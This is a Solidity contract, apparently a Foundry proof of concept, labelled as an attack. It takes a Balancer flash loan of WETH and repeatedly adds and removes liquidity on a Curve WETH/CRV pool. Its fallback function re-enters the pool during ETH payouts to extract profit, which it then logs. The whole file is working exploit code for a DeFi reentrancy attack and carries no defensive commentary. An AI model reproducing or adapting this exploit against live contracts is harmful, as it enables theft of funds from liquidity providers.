import "src/interfaces/flashloan/balancer/IBalancerVaultFlashloan.sol";
import "src/interfaces/flashloan/balancer/IBalancerVaultFlashloanReceiver.sol";
import "src/interfaces/dex/curve/ICryptoSwap.sol";

import "src/interfaces/tokens/IERC20.sol";
import "src/interfaces/tokens/IWETH.sol";
import "src/constants/mainnet.sol";
import "forge-std/console.sol";

contract Shaman is IBalancerVaultFlashloanReceiver {
    function peek() external {

    }

    // attack entrypoint
    function beat() external {
        address[] memory _tokens = new address[](1);
        _tokens[0] = WETH;

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 10000E18;

        IBalancerVaultFlashloan(BALANCER_VAULT).flashLoan(this, _tokens, _amounts, "ff");        

        console.log("[>*BOOM*<] Profit: ");
        console.log(" ETH = ", IWETH(WETH).balanceOf(address(this)));
        console.log(" CRV = ", IERC20(CRV).balanceOf(address(this)));
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        IWETH(WETH).withdraw(amounts[0]);
        IERC20(CRV).approve(CURVE_CRYPTO_SWAP_WETH_CRV_POOL, type(uint).max);

        for (uint i; i < 20;) {
            uint256[2] memory _amounts = [uint256(400e18), 0];

            ICryptoSwap(CURVE_CRYPTO_SWAP_WETH_CRV_POOL).add_liquidity{value: 400 ether}(_amounts, 0, true);

            _amounts[0] = 0;
            ICryptoSwap(CURVE_CRYPTO_SWAP_WETH_CRV_POOL).remove_liquidity(IERC20(crvCRVETH).balanceOf(address(this)), _amounts, true);

            ICryptoSwap(CURVE_CRYPTO_SWAP_WETH_CRV_POOL).remove_liquidity_one_coin(IERC20(crvCRVETH).balanceOf(address(this)), 0, 0, true);

            unchecked {
                ++i;
            }
        }

        flag = true;
        ICryptoSwap(payable(CURVE_CRYPTO_SWAP_WETH_CRV_POOL)).exchange(1, 0, IERC20(CRV).balanceOf(address(this)) / 2, 0, true);
        IWETH(WETH).deposit{value: address(this).balance}();

        IERC20(WETH).transfer(BALANCER_VAULT, amounts[0]);
    }

    bool flag;

    fallback() external payable {
        if (msg.sender != CURVE_CRYPTO_SWAP_WETH_CRV_POOL) {
            return;
        }
        if (flag) {
            flag = false;
            return;
        }

        flag = true;
        uint256[2] memory _amounts = [uint256(400e18), 0];
        ICryptoSwap(CURVE_CRYPTO_SWAP_WETH_CRV_POOL).add_liquidity{value: 400 ether}(_amounts, 0, true);
        
        // swap ETH for CRV
        ICryptoSwap(CURVE_CRYPTO_SWAP_WETH_CRV_POOL).exchange{value: 500 ether}(0, 1, 500e18, 0, true);
    }
}